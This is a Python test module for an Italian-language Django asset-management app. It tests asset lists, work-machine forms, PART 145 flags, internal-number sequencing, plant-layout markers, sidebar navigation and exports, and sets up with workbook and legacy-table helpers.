from __future__ import annotations

import io
import json
import shutil
from contextlib import contextmanager
from datetime import date, timedelta
from decimal import Decimal
from pathlib import Path
from unittest.mock import patch
from uuid import uuid4

from django.contrib.auth import get_user_model
from django.conf import settings
from django.contrib.messages.storage.fallback import FallbackStorage
from django.contrib.sessions.middleware import SessionMiddleware
from django.core.management import call_command
from django.core.management.base import CommandError
from django.core.files.uploadedfile import SimpleUploadedFile
from django.db import DatabaseError, connection
from django.http import HttpResponse
from django.test import RequestFactory, TestCase, override_settings
from django.urls import reverse
from django.utils import timezone
from openpyxl import Workbook, load_workbook
from types import SimpleNamespace
from PIL import Image

from anagrafica.models import Fornitore, FornitoreDocumento
from core.legacy_models import AnagraficaDipendente, Pulsante, UtenteLegacy
from core.models import UserDashboardLayout, UserOnboarding
from core.upload_mime import UploadMimeValidationError
from tickets.models import PrioritaTicket, StatoTicket, Ticket, TipoTicket

from . import views as asset_views
from .forms import (
    AssetAdministrativeDeadlineForm,
    AssetComponentForm,
    MaintenanceRuleAssetOverrideForm,
    MaintenanceRuleForm,
)
from .maintenance import (
    build_day_based_maintenance_schedule_rows,
    build_maintenance_schedule_rows,
    meter_schedule_payload,
    resolve_asset_maintenance_rules,
    sync_workorder_maintenance_state,
    upsert_asset_maintenance_rule_state,
)
from .services.asset_catalog_import import AssetCatalogImporter
from .models import (
    Asset,
    AssetActionButton,
    AssetAdministrativeDeadline,
    AssetAdministrativeDeadlineCompletion,
    AssetAdministrativeDeadlineCompletionAttachment,
    AssetCategory,
    AssetCategoryDocumentFolder,
    AssetCategoryField,
    AssetComponent,
    AssetCustomField,
    AssetDetailField,
    AssetDetailSectionLayout,
    AssetDocument,
    AssetEndpoint,
    AssetITDetails,
    AssetLabelTemplate,
    AssetListLayout,
    AssetListOption,
    AssetMaintenanceBudget,
    AssetMaintenanceRuleState,
    AssetMeter,
    AssetCalendarEvent,
    MaintenanceChecklistStep,
    MaintenanceInterventionTemplate,
    MaintenanceRule,
    MaintenanceRuleAssetOverride,
    AssistanceContract,
    AssetReportDefinition,
    AssetReportTemplate,
    AssetSidebarButton,
    AssetTimelineEntry,
    PeriodicVerification,
    PlantLayout,
    PlantLayoutArea,
    PlantLayoutMarker,
    SoftwareLicense,
    WorkMachine,
    WorkOrder,
    WorkOrderAttachment,
    WorkOrderChecklist,
    WorkOrderLog,
)

User = get_user_model()


def _make_workspace_tempdir(prefix: str) -> Path:
    root = Path.cwd() / "django_app" / ".tmp_tests"
    root.mkdir(parents=True, exist_ok=True)
    target = root / f"{prefix}{uuid4().hex}"
    target.mkdir(parents=True, exist_ok=False)
    return target


@contextmanager
def _workspace_temporary_directory(prefix: str):
    target = _make_workspace_tempdir(prefix)
    try:
        yield str(target)
    finally:
        shutil.rmtree(target, ignore_errors=True)


def _complete_onboarding(user) -> None:
    UserOnboarding.objects.update_or_create(
        user=user,
        defaults={
            "completed": True,
            "skipped": False,
            "completed_at": timezone.now(),
        },
    )


def _valid_png_upload(name: str = "planimetria.png") -> SimpleUploadedFile:
    buffer = io.BytesIO()
    Image.new("RGB", (2, 2), "#ffffff").save(buffer, format="PNG")
    return SimpleUploadedFile(name, buffer.getvalue(), content_type="image/png")


def _attach_session(request) -> None:
    middleware = SessionMiddleware(lambda req: HttpResponse("ok"))
    middleware.process_request(request)
    request.session.save()


def _ensure_legacy_pulsanti_table() -> None:
    vendor = connection.vendor
    with connection.cursor() as cursor:
        if vendor == "sqlite":
            cursor.execute(
                """
                CREATE TABLE IF NOT EXISTS pulsanti (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    codice VARCHAR(100) NOT NULL,
                    nome_visibile VARCHAR(200) NULL,
                    icona VARCHAR(20) NULL,
                    modulo VARCHAR(100) NOT NULL,
                    url VARCHAR(500) NOT NULL
                )
                """
            )
        else:
            cursor.execute(
                """
                IF OBJECT_ID('pulsanti', 'U') IS NULL
                CREATE TABLE pulsanti (
                    id INT IDENTITY(1,1) PRIMARY KEY,
                    codice NVARCHAR(100) NOT NULL,
                    nome_visibile NVARCHAR(200) NULL,
                    icona NVARCHAR(20) NULL,
                    modulo NVARCHAR(100) NOT NULL,
                    url NVARCHAR(500) NOT NULL
                )
                """
            )


def _ensure_anagrafica_table() -> None:
    from core.legacy_anagrafica import ensure_anagrafica_schema

    vendor = connection.vendor
    with connection.cursor() as cursor:
        if vendor == "sqlite":
            cursor.execute("DROP TABLE IF EXISTS anagrafica_dipendenti")
            cursor.execute(
                """
                CREATE TABLE anagrafica_dipendenti (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    aliasusername VARCHAR(200) NULL,
                    nome VARCHAR(200) NULL,
                    cognome VARCHAR(200) NULL,
                    mansione VARCHAR(200) NULL,
                    reparto VARCHAR(200) NULL,
                    ruolo VARCHAR(200) NULL,
                    matricola VARCHAR(100) NULL,
                    attivo INTEGER NULL,
                    email VARCHAR(200) NULL,
                    email_notifica VARCHAR(200) NULL,
                    utente_id INTEGER NULL
                )
                """
            )
        else:
            cursor.execute(
                """
                IF OBJECT_ID('anagrafica_dipendenti', 'U') IS NOT NULL
                    DROP TABLE anagrafica_dipendenti
                CREATE TABLE anagrafica_dipendenti (
                    id INT IDENTITY(1,1) PRIMARY KEY,
                    aliasusername NVARCHAR(200) NULL,
                    nome NVARCHAR(200) NULL,
                    cognome NVARCHAR(200) NULL,
                    mansione NVARCHAR(200) NULL,
                    reparto NVARCHAR(200) NULL,
                    ruolo NVARCHAR(200) NULL,
                    matricola NVARCHAR(100) NULL,
                    attivo BIT NULL,
                    email NVARCHAR(200) NULL,
                    email_notifica NVARCHAR(200) NULL,
                    utente_id INT NULL
                )
                """
            )
    ensure_anagrafica_schema()


def _build_workbook(path: Path, sheet_name: str = "LAN A 203.0.113.x") -> None:
    headers = [
        "REPARTO",
        "NOME PC",
        "TIPO",
        "MODELLO",
        "ID",
        "VLAN",
        "IP",
        "SWITCH",
        "PORTA SWITCH",
        "PUNTO",
        "OS",
        "CPU",
        "RAM",
        "DISCO",
        "DOMAIN",
        "EDPR",
        "AD360",
        "2FA OFFICE",
        "PSW BIOS",
        "ULTIMA MTZ",
    ]
    row_values = [
        "IT",
        "PC-UFFICIO-01",
        "PC",
        "Dell 5520",
        "SN-123",
        23,
        "198.51.100.23",
        "SW-01",
        "Gi1/0/15",
        "A-10",
        "Windows 11",
        "i7",
        "16GB",
        "512GB SSD",
        "SI",
        "SI",
        "NO",
        "SI",
        "present",
        "2026-01-15",
    ]
    _build_workbook_custom(path, sheet_name=sheet_name, headers=headers, rows=[row_values], header_row=5)


def _build_workbook_custom(
    path: Path,
    *,
    sheet_name: str,
    headers: list[str],
    rows: list[list[object]],
    header_row: int = 5,
) -> None:
    wb = Workbook()
    ws = wb.active
    ws.title = sheet_name
    for col_idx, header in enumerate(headers, start=1):
        ws.cell(row=header_row, column=col_idx, value=header)
    for row_offset, row_values in enumerate(rows, start=1):
        for col_idx, value in enumerate(row_values, start=1):
            ws.cell(row=header_row + row_offset, column=col_idx, value=value)
    wb.save(path)


def _build_work_machine_workbook(path: Path, rows: list[list[object]]) -> None:
    _build_workbook_custom(
        path,
        sheet_name="Foglio1",
        headers=[
            "REPARTO",
            "Name",
            "X (mm)",
            "Y (mm)",
            "Z (mm)",
            "DIAMETER (mm)",
            "Spindle (mm)",
            "Year",
            "TMC",
            "TCR",
            "Pressure (bar)",
            "CNC",
            "5 AXES",
            "Accuracy from",
        ],
        rows=rows,
        header_row=1,
    )


def _label_template_payload(*, preview_asset_id: int | None = None, **overrides) -> dict[str, str]:
    payload = {
        "name": "Layout officina",
        "page_width_mm": "110",
        "page_height_mm": "70",
        "qr_size_mm": "28",
        "qr_position": "LEFT",
        "show_logo": "on",
        "logo_height_mm": "11",
        "logo_alignment": "CENTER",
        "title_font_size_pt": "18",
        "body_font_size_pt": "9",
        "show_border": "on",
        "border_radius_mm": "6",
        "show_field_labels": "on",
        "show_target_label": "on",
        "show_help_text": "on",
        "background_color": "#F8FAFC",
        "border_color": "#0F172A",
        "text_color": "#111827",
        "accent_color": "#2563EB",
        "title_primary_field": "asset_tag",
        "title_secondary_field": "name",
        "body_fields_payload": json.dumps(["asset_type", "reparto", "year", "cnc_controlled"]),
    }
    if preview_asset_id:
        payload["preview_asset_id"] = str(preview_asset_id)
    payload.update(overrides)
    return payload


@override_settings(LEGACY_AUTH_ENABLED=False, SECURE_SSL_REDIRECT=False)
class AssetsRoutingTests(TestCase):
    def setUp(self):
        self.user = User.objects.create_user(username="asset-user", password="pass12345")
        _complete_onboarding(self.user)
        self.factory = RequestFactory()
        self._config_tmpdir = _make_workspace_tempdir("assets-config-")
        self._config_path = self._config_tmpdir / ".env"
        self._config_path.write_text("", encoding="utf-8")
        self._config_patcher = patch("config.env_config.default_env_path", return_value=self._config_path)
        self._config_patcher.start()

    def tearDown(self):
        self._config_patcher.stop()
        shutil.rmtree(self._config_tmpdir, ignore_errors=True)
        super().tearDown()

    def test_assets_list_200_when_logged(self):
        self.client.force_login(self.user)
        response = self.client.get(reverse("assets:asset_list"))
        self.assertEqual(response.status_code, 200)

    def test_asset_dashboard_category_links_use_asset_category_filter(self):
        category = AssetCategory.objects.create(
            code="pressa-dashboard-link",
            label="Pressa dashboard link",
            is_active=True,
        )

        self.client.force_login(self.user)
        response = self.client.get(reverse("assets:asset_dashboard"))

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, f"?asset_category={category.id}", html=False)
        self.assertNotContains(response, f"?category={category.id}", html=False)

    def test_asset_list_legacy_category_query_redirects_and_filters(self):
        pressa = AssetCategory.objects.create(code="pressa", label="Pressa", is_active=True)
        forni = AssetCategory.objects.create(code="forni", label="Forni", is_active=True)
        Asset.objects.create(asset_tag="AST-PRESSA-001", name="Pressa M", asset_category=pressa)
        Asset.objects.create(asset_tag="AST-FORNO-001", name="Forno A", asset_category=forni)

        self.client.force_login(self.user)
        response = self.client.get(f"{reverse('assets:asset_list')}?category={pressa.id}", follow=True)

        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.redirect_chain[0][1], 302)
        self.assertIn(f"asset_category={pressa.id}", response.redirect_chain[0][0])
        self.assertNotIn("?category=", response.redirect_chain[0][0])
        self.assertNotIn("&category=", response.redirect_chain[0][0])
        body = response.content.decode("utf-8")
        self.assertIn("AST-PRESSA-001", body)
        self.assertNotIn("AST-FORNO-001", body)

    def test_assets_list_200_when_logged_as_admin(self):
        admin = User.objects.create_superuser(
            username="asset-admin-list",
            email="asset-admin-list@test.local",
            password="pass12345",
        )
        self.client.force_login(admin)
        response = self.client.get(reverse("assets:asset_list"))
        self.assertEqual(response.status_code, 200)

    def test_dashboard_open_workorder_alert_rows_returns_empty_on_database_error(self):
        with patch.object(asset_views.WorkOrder.objects, "select_related", side_effect=DatabaseError("schema mismatch")):
            rows = asset_views._dashboard_open_workorder_alert_rows(limit=4)
        self.assertEqual(rows, [])

    def test_assets_list_falls_back_when_layout_table_is_unavailable(self):
        self.client.force_login(self.user)
        with patch.object(AssetListLayout.objects, "all", side_effect=DatabaseError("missing assets_assetlistlayout")):
            response = self.client.get(reverse("assets:asset_list"))
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Inventario asset")
        self.assertContains(response, 'data-col-toggle="name" checked', html=False)

    def test_asset_list_export_pdf_returns_shared_template_pdf(self):
        Asset.objects.create(
            asset_tag="PDF-001",
            name="Asset export PDF",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="CN5",
            source_key="manual-export-pdf-shared-template",
        )
        self.client.force_login(self.user)

        response = self.client.get(reverse("assets:asset_list_export"), {"format": "pdf"})

        self.assertEqual(response.status_code, 200)
        self.assertTrue(response["Content-Type"].startswith("application/pdf"))
        self.assertTrue(response.content.startswith(b"%PDF"))
        self.assertGreater(len(response.content), 800)

    def test_assets_list_persists_table_layout_server_side(self):
        self.client.force_login(self.user)
        response = self.client.post(
            reverse("assets:asset_list"),
            data=json.dumps(
                {
                    "action": "save_asset_table_layout",
                    "context_key": "all",
                    "visible_columns": ["name", "status"],
                    "column_order": ["status", "name"],
                    "column_widths": {"name": 320},
                }
            ),
            content_type="application/json",
        )

        self.assertEqual(response.status_code, 200)
        self.assertTrue(response.json()["ok"])
        saved_row = UserDashboardLayout.objects.get(legacy_user_id=-self.user.id)
        saved_layout = saved_row.layout["assets_table"]["all"]
        self.assertEqual(saved_layout["visible_columns"], ["name", "status"])
        self.assertEqual(saved_layout["column_order"], ["status", "name"])
        self.assertEqual(saved_layout["column_widths"], {"name": 320})

        page = self.client.get(reverse("assets:asset_list"))
        self.assertEqual(page.status_code, 200)
        self.assertContains(page, '"visible_columns": ["name", "status"]', html=False)
        self.assertContains(page, '"column_order": ["status", "name"]', html=False)
        self.assertContains(page, '"column_widths": {"name": 320}', html=False)

    def test_non_admin_cannot_create_custom_field(self):
        self.client.force_login(self.user)
        response = self.client.post(
            reverse("assets:asset_list"),
            {
                "action": "create_custom_field",
                "label": "Ubicazione Rack",
                "field_type": "TEXT",
                "is_active": "1",
            },
        )
        self.assertEqual(response.status_code, 302)
        self.assertFalse(AssetCustomField.objects.exists())

    def test_superuser_can_create_custom_field(self):
        admin = User.objects.create_superuser(username="asset-admin", email="asset-admin@test.local", password="pass12345")
        self.client.force_login(admin)
        response = self.client.post(
            reverse("assets:asset_list"),
            {
                "action": "create_custom_field",
                "label": "Ubicazione Rack",
                "field_type": "TEXT",
                "is_active": "1",
            },
        )
        self.assertEqual(response.status_code, 302)
        self.assertTrue(AssetCustomField.objects.filter(label="Ubicazione Rack").exists())

    def test_asset_form_renders_dynamic_custom_field(self):
        AssetCustomField.objects.create(code="ubicazione-rack", label="Ubicazione Rack", field_type="TEXT", is_active=True)
        self.client.force_login(self.user)
        response = self.client.get(reverse("assets:asset_create"))
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Ubicazione Rack")

    def test_asset_detail_shows_foto_targhetta_only_when_present(self):
        self.client.force_login(self.user)
        with _workspace_temporary_directory("assets-targhetta-") as tmpdir:
            with override_settings(MEDIA_ROOT=Path(tmpdir)):
                con_foto = Asset.objects.create(
                    asset_tag="CNC-TARGA-1",
                    name="Tornio con targhetta",
                    asset_type=Asset.TYPE_CNC,
                    foto_targhetta=_valid_png_upload("targhetta.png"),
                )
                senza_foto = Asset.objects.create(
                    asset_tag="CNC-TARGA-2",
                    name="Tornio senza targhetta",
                    asset_type=Asset.TYPE_CNC,
                )

                resp_con = self.client.get(reverse("assets:asset_view", args=[con_foto.id]))
                self.assertEqual(resp_con.status_code, 200)
                # Il markup dell'<img> (non la sola classe CSS, sempre presente) prova il render.
                self.assertContains(resp_con, 'img class="af-targhetta"')

                resp_senza = self.client.get(reverse("assets:asset_view", args=[senza_foto.id]))
                self.assertEqual(resp_senza.status_code, 200)
                # "se vuota, non si vede": nessuno slot immagine quando manca la targhetta.
                self.assertNotContains(resp_senza, 'img class="af-targhetta"')

    def test_asset_detail_targhetta_is_lightbox_enabled(self):
        self.client.force_login(self.user)
        with _workspace_temporary_directory("assets-lightbox-") as tmpdir:
            with override_settings(MEDIA_ROOT=Path(tmpdir)):
                con_foto = Asset.objects.create(
                    asset_tag="CNC-LIGHT-1",
                    name="Tornio lightbox",
                    asset_type=Asset.TYPE_CNC,
                    foto_targhetta=_valid_png_upload("targhetta.png"),
                )
                senza_foto = Asset.objects.create(
                    asset_tag="CNC-LIGHT-2",
                    name="Tornio senza foto",
                    asset_type=Asset.TYPE_CNC,
                )

                resp_con = self.client.get(reverse("assets:asset_view", args=[con_foto.id]))
                self.assertEqual(resp_con.status_code, 200)
                # Overlay lightbox + trigger cliccabile che porta la src dell'immagine.
                # NB: 'data-lightbox-src="' (doppio apice) è solo nel markup; il JS usa
                # getAttribute('data-lightbox-src') con apici singoli.
                self.assertContains(resp_con, 'id="af-lightbox"')
                self.assertContains(resp_con, 'class="af-targhetta-trigger"')
                self.assertContains(resp_con, 'data-lightbox-src="')

                resp_senza = self.client.get(reverse("assets:asset_view", args=[senza_foto.id]))
                self.assertEqual(resp_senza.status_code, 200)
                # L'overlay è sempre iniettato; il trigger no (nessuna immagine da aprire).
                self.assertContains(resp_senza, 'id="af-lightbox"')
                self.assertNotContains(resp_senza, 'class="af-targhetta-trigger"')
                self.assertNotContains(resp_senza, 'data-lightbox-src="')

    def test_work_machine_create_saves_foto_targhetta(self):
        self.client.force_login(self.user)
        with _workspace_temporary_directory("assets-wm-targhetta-") as tmpdir:
            with override_settings(MEDIA_ROOT=Path(tmpdir)):
                response = self.client.post(
                    reverse("assets:work_machine_create"),
                    {
                        "name": "Fresa con targhetta",
                        "reparto": "CN5",
                        "status": Asset.STATUS_IN_USE,
                        "documents_specs_payload": json.dumps([]),
                        "documents_manuals_payload": json.dumps([]),
                        "documents_interventions_payload": json.dumps([]),
                        "foto_targhetta": _valid_png_upload("targhetta.png"),
                    },
                )
                self.assertEqual(response.status_code, 302)
                asset = Asset.objects.get(name="Fresa con targhetta")
                self.assertTrue(asset.foto_targhetta)
                self.assertTrue(Path(asset.foto_targhetta.path).exists())

    def test_work_machine_create_saves_part_145(self):
        self.client.force_login(self.user)
        response = self.client.post(
            reverse("assets:work_machine_create"),
            {
                "name": "Fresa PART 145",
                "reparto": "CN5",
                "status": Asset.STATUS_IN_USE,
                "documents_specs_payload": json.dumps([]),
                "documents_manuals_payload": json.dumps([]),
                "documents_interventions_payload": json.dumps([]),
                "part_145": "on",
            },
        )
        self.assertEqual(response.status_code, 302)
        asset = Asset.objects.get(name="Fresa PART 145")
        self.assertTrue(asset.part_145)

    def test_work_machine_form_renders_part_145_checkbox(self):
        # Il campo è in Meta.fields (quindi si salva), ma il template macchine
        # renderizza i campi per gruppi: senza inserirlo nel blocco checkbox non
        # compariva a video pur essendo un campo valido del form.
        self.client.force_login(self.user)
        resp = self.client.get(reverse("assets:work_machine_create"))
        self.assertEqual(resp.status_code, 200)
        self.assertContains(resp, 'name="part_145"')
        self.assertContains(resp, "Rientra in PART 145")

    def test_work_machine_form_renders_internal_number(self):
        # Il "Numero interno" (N.INT) era esposto nel form asset generico ma NON
        # nel form Macchine di lavoro -> incoerenza fra asset. Ora c'è in entrambi.
        self.client.force_login(self.user)
        resp = self.client.get(reverse("assets:work_machine_create"))
        self.assertEqual(resp.status_code, 200)
        self.assertContains(resp, 'name="internal_number"')
        self.assertContains(resp, "Numero interno")

    def test_work_machine_create_saves_internal_number(self):
        self.client.force_login(self.user)
        response = self.client.post(
            reverse("assets:work_machine_create"),
            {
                "name": "Fresa con N.INT",
                "reparto": "CN5",
                "status": Asset.STATUS_IN_USE,
                "internal_number": "INT-4567",
                "documents_specs_payload": json.dumps([]),
                "documents_manuals_payload": json.dumps([]),
                "documents_interventions_payload": json.dumps([]),
            },
        )
        self.assertEqual(response.status_code, 302)
        asset = Asset.objects.get(name="Fresa con N.INT")
        self.assertEqual(asset.internal_number, "INT-4567")

    def test_internal_number_next_segue_convenzione_int(self):
        # Convenzione storica "Int.NNN": il bottone propone max+1 col prefisso.
        Asset.objects.create(asset_tag="N-INT-1", name="a", internal_number="Int.262")
        Asset.objects.create(asset_tag="N-INT-2", name="b", internal_number="Int.188A")
        self.client.force_login(self.user)
        resp = self.client.get(reverse("assets:internal_number_next"))
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(resp.json()["next"], "Int.263")

    def test_internal_number_next_assorbe_valori_nudi_legacy(self):
        # I valori nudi legacy (es. 196/197) entrano nella stessa sequenza.
        Asset.objects.create(asset_tag="N-INT-3", name="c", internal_number="196")
        Asset.objects.create(asset_tag="N-INT-4", name="d", internal_number="197")
        self.client.force_login(self.user)
        resp = self.client.get(reverse("assets:internal_number_next"))
        self.assertEqual(resp.json()["next"], "Int.198")

    def test_asset_form_shows_assegna_progressivo_button(self):
        self.client.force_login(self.user)
        resp = self.client.get(reverse("assets:asset_create"))
        self.assertEqual(resp.status_code, 200)
        self.assertContains(resp, "Assegna progressivo")
        self.assertContains(resp, reverse("assets:internal_number_next"))

    def test_asset_detail_shows_part_145_badge_only_when_flagged(self):
        self.client.force_login(self.user)
        flagged = Asset.objects.create(asset_tag="AST-P145-B1", name="Con centoquarantacinque", part_145=True)
        normal = Asset.objects.create(asset_tag="AST-P145-B2", name="Senza flag", part_145=False)

        # NB: la stringa "PART 145" compare anche nella sidebar (voce di navigazione),
        # quindi si asserisce sul markup specifico del badge dell'header.
        resp_yes = self.client.get(reverse("assets:asset_view", args=[flagged.id]))
        self.assertEqual(resp_yes.status_code, 200)
        self.assertContains(resp_yes, 'class="af-pill af-pill--part145"')

        resp_no = self.client.get(reverse("assets:asset_view", args=[normal.id]))
        self.assertEqual(resp_no.status_code, 200)
        self.assertNotContains(resp_no, 'class="af-pill af-pill--part145"')

    def test_part_145_list_gated_and_shows_only_flagged(self):
        # Gated come le altre viste asset: l'anonimo non ottiene la pagina.
        resp_anon = self.client.get(reverse("assets:part_145_list"))
        self.assertNotEqual(resp_anon.status_code, 200)

        self.client.force_login(self.user)
        flagged = Asset.objects.create(asset_tag="AST-P145-L1", name="Aeromobile Uno", part_145=True)
        Asset.objects.create(asset_tag="AST-P145-L2", name="Muletto Due", part_145=False)
        resp = self.client.get(reverse("assets:part_145_list"))
        self.assertEqual(resp.status_code, 200)
        self.assertContains(resp, "Aeromobile Uno")
        self.assertNotContains(resp, "Muletto Due")

    def test_part_145_nav_item_is_data_driven_in_sidebar(self):
        self.client.force_login(self.user)
        resp = self.client.get(reverse("assets:asset_list"))
        self.assertEqual(resp.status_code, 200)
        # La voce di navigazione (seed AssetSidebarButton) linka la sezione PART 145.
        self.assertContains(resp, reverse("assets:part_145_list"))

    def test_part_145_list_includes_module_sidebar_context(self):
        # Regressione: la sezione PART 145 non passava il context della shell asset
        # -> sidebar del modulo VUOTA. Ora deve includerlo (assets_sidebar_groups).
        self.client.force_login(self.user)
        resp = self.client.get(reverse("assets:part_145_list"))
        self.assertEqual(resp.status_code, 200)
        self.assertIn("assets_sidebar_groups", resp.context)
        self.assertIsNotNone(resp.context["assets_sidebar_groups"])

    def test_part_145_export_excel_and_pdf(self):
        self.client.force_login(self.user)
        Asset.objects.create(asset_tag="AST-P145-X1", name="Aeromobile Export", part_145=True)
        xlsx = self.client.get(reverse("assets:part_145_export_excel"))
        self.assertEqual(xlsx.status_code, 200)
        self.assertIn("spreadsheetml", xlsx["Content-Type"])
        self.assertIn("attachment", xlsx["Content-Disposition"])
        pdf = self.client.get(reverse("assets:part_145_export_pdf"))
        self.assertEqual(pdf.status_code, 200)
        self.assertEqual(pdf["Content-Type"], "application/pdf")

    def test_asset_detail_plant_layout_uses_reparto_layout_not_default(self):
        # Bug: la scheda mostrava sempre la piantina di DEFAULT (primo layout attivo),
        # non quella del reparto dell'asset. Il marker storico va auto-riallineato.
        self.client.force_login(self.user)
        with _workspace_temporary_directory("assets-p145-map-") as tmpdir:
            with override_settings(MEDIA_ROOT=Path(tmpdir)):
                officina = PlantLayout.objects.create(
                    category="Officina", name="Officina", image=_valid_png_upload("o.png"), is_active=True
                )
                cromatura = PlantLayout.objects.create(
                    category="Reparto Cromatura", name="Cromatura", image=_valid_png_upload("c.png"), is_active=True
                )
                asset = Asset.objects.create(asset_tag="AST-MAP-1", name="Vasca", reparto="Reparto Cromatura")
                # Marker "storico" sul layout SBAGLIATO (default Officina).
                PlantLayoutMarker.objects.create(
                    layout=officina, asset=asset, x_percent=10, y_percent=10, is_visible=True
                )
                resp = self.client.get(reverse("assets:asset_view", args=[asset.id]))
                self.assertEqual(resp.status_code, 200)
                # La scheda mostra il layout del REPARTO, non quello di default.
                self.assertEqual(resp.context["map_marker"].layout_id, cromatura.id)
                # Self-heal: il marker è stato spostato sul layout corretto.
                self.assertTrue(PlantLayoutMarker.objects.filter(asset=asset, layout=cromatura).exists())
                self.assertFalse(PlantLayoutMarker.objects.filter(asset=asset, layout=officina).exists())

    def test_asset_list_firewall_context_uses_common_default_columns(self):
        firewall_asset = Asset.objects.create(
            asset_tag="IT-FW-001",
            name="Firewall bordo rete",
            asset_type=Asset.TYPE_FIREWALL,
            reparto="CED",
            manufacturer="Fortinet",
            model="FG-100F",
            serial_number="FGT123456",
            extra_columns={"rack_label": "ARM-12"},
        )
        AssetEndpoint.objects.create(
            asset=firewall_asset,
            endpoint_name="WAN",
            vlan=23,
            ip="192.0.2.10",
        )
        AssetCustomField.objects.create(code="rack_label", label="Rack label", field_type="TEXT", is_active=True)
        AssetCustomField.objects.create(code="x_mm", label="X (mm)", field_type="NUMBER", is_active=True)

        self.client.force_login(self.user)
        response = self.client.get(reverse("assets:asset_list") + "?asset_type=FIREWALL")

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Vista")
        self.assertContains(response, 'assets.list.network', html=False)
        self.assertContains(response, 'data-col-toggle="assignment_location" checked', html=False)
        self.assertContains(response, 'data-col-toggle="serial_number" checked', html=False)
        self.assertNotContains(response, 'data-col-toggle="vlan"', html=False)
        self.assertNotContains(response, 'data-col-toggle="ip"', html=False)
        self.assertNotContains(response, 'data-col-toggle="custom_rack_label"', html=False)
        self.assertContains(response, "Firewall bordo rete")
        self.assertContains(response, "FGT123456")
        self.assertNotContains(response, "192.0.2.10")

    def test_asset_dashboard_redirects_legacy_filtered_list_urls(self):
        self.client.force_login(self.user)

        response = self.client.get(
            reverse("assets:asset_dashboard"),
            {"asset_type": Asset.TYPE_FIREWALL, "rows": 25},
        )

        self.assertEqual(response.status_code, 302)
        self.assertEqual(
            response["Location"],
            f"{reverse('assets:asset_list')}?asset_type={Asset.TYPE_FIREWALL}&rows=25",
        )

    def test_default_sidebar_seed_rows_use_canonical_asset_list_routes(self):
        targets_by_code = {
            row["code"]: row["target_url"]
            for row in asset_views._default_sidebar_seed_rows()
        }

        self.assertEqual(
            targets_by_code["dashboard"],
            "django:assets:asset_list?rows={rows}",
        )
        self.assertEqual(
            targets_by_code["networking"],
            "django:assets:asset_list?asset_type=FIREWALL&rows={rows}",
        )

    def test_asset_sidebar_nests_children_collapsed_by_default(self):
        AssetSidebarButton.objects.all().delete()
        parent = AssetSidebarButton.objects.create(
            code="catnav-root-test",
            section=AssetSidebarButton.SECTION_MAIN,
            label="Apparecchi di presa",
            target_url="django:assets:asset_list?asset_category=10&rows={rows}",
            active_match="asset_category=10",
            sort_order=20,
        )
        AssetSidebarButton.objects.create(
            code="catnav-child-test",
            section=AssetSidebarButton.SECTION_MAIN,
            parent=parent,
            label="Bitrave",
            target_url="django:assets:asset_list?asset_category=11&rows={rows}",
            active_match="asset_category=11",
            sort_order=2100,
        )

        request = self.factory.get(reverse("assets:asset_list"))
        request.user = self.user
        groups = asset_views._build_sidebar_groups(request)
        parent_item = groups[0]["items"][0]

        self.assertTrue(parent_item["has_children"])
        self.assertFalse(parent_item["expanded"])
        self.assertEqual(parent_item["children"][0]["label"], "Bitrave")

        active_request = self.factory.get(reverse("assets:asset_list"), {"asset_category": "11"})
        active_request.user = self.user
        active_parent = asset_views._build_sidebar_groups(active_request)[0]["items"][0]
        self.assertTrue(active_parent["expanded"])
        self.assertTrue(active_parent["children"][0]["active"])

    def test_asset_sidebar_category_active_match_is_exact(self):
        AssetSidebarButton.objects.all().delete()
        cmm_parent = AssetSidebarButton.objects.create(
            code="catnav-root-cmm",
            section=AssetSidebarButton.SECTION_MAIN,
            label="CMM",
            target_url="django:assets:asset_list?asset_category=608&rows={rows}",
            active_match="asset_category=608",
            sort_order=20,
        )
        AssetSidebarButton.objects.create(
            code="catnav-cmm-controllo",
            section=AssetSidebarButton.SECTION_MAIN,
            parent=cmm_parent,
            label="Controllo",
            target_url="django:assets:asset_list?asset_category=608&rows={rows}",
            active_match="asset_category=608",
            sort_order=2000,
        )
        novicrom_parent = AssetSidebarButton.objects.create(
            code="catnav-root-novicrom",
            section=AssetSidebarButton.SECTION_MAIN,
            label="Costruzioni Novicrom",
            target_url="django:assets:asset_list?asset_category=6&rows={rows}",
            active_match="asset_category=6",
            sort_order=21,
        )
        AssetSidebarButton.objects.create(
            code="catnav-novicrom-blsd",
            section=AssetSidebarButton.SECTION_MAIN,
            parent=novicrom_parent,
            label="Bls d",
            target_url="django:assets:asset_list?asset_category=60&rows={rows}",
            active_match="asset_category=60",
            sort_order=2100,
        )

        active_request = self.factory.get(
            reverse("assets:asset_list"),
            {"asset_category": "608", "rows": "25"},
        )
        active_request.user = self.user
        groups = asset_views._build_sidebar_groups(active_request)
        items = {item["label"]: item for item in groups[0]["items"]}

        self.assertTrue(items["CMM"]["expanded"])
        self.assertTrue(items["CMM"]["children"][0]["active"])
        self.assertFalse(items["Costruzioni Novicrom"]["expanded"])
        self.assertFalse(items["Costruzioni Novicrom"]["children"][0]["active"])

    def test_asset_sidebar_template_renders_collapsible_groups(self):
        AssetSidebarButton.objects.all().delete()
        parent = AssetSidebarButton.objects.create(
            code="catnav-root-template",
            section=AssetSidebarButton.SECTION_MAIN,
            label="CNC",
            target_url="django:assets:asset_list?asset_category=20&rows={rows}",
            active_match="asset_category=20",
            sort_order=20,
        )
        AssetSidebarButton.objects.create(
            code="catnav-child-template",
            section=AssetSidebarButton.SECTION_MAIN,
            parent=parent,
            label="Macchine CNC",
            target_url="django:assets:asset_list?asset_category=21&rows={rows}",
            active_match="asset_category=21",
            sort_order=2100,
        )

        self.client.force_login(self.user)
        response = self.client.get(reverse("assets:asset_list"))

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, 'data-li-nav-group', html=False)
        self.assertContains(response, 'class="li-nav-children"', html=False)
        self.assertContains(response, 'aria-expanded="false"', html=False)
        self.assertContains(response, "localStorage.removeItem(storageKey)", html=False)
        self.assertContains(response, "closeOtherGroups", html=False)
        self.assertNotContains(response, "localStorage.setItem(storageKey", html=False)
        self.assertContains(response, "Macchine CNC")

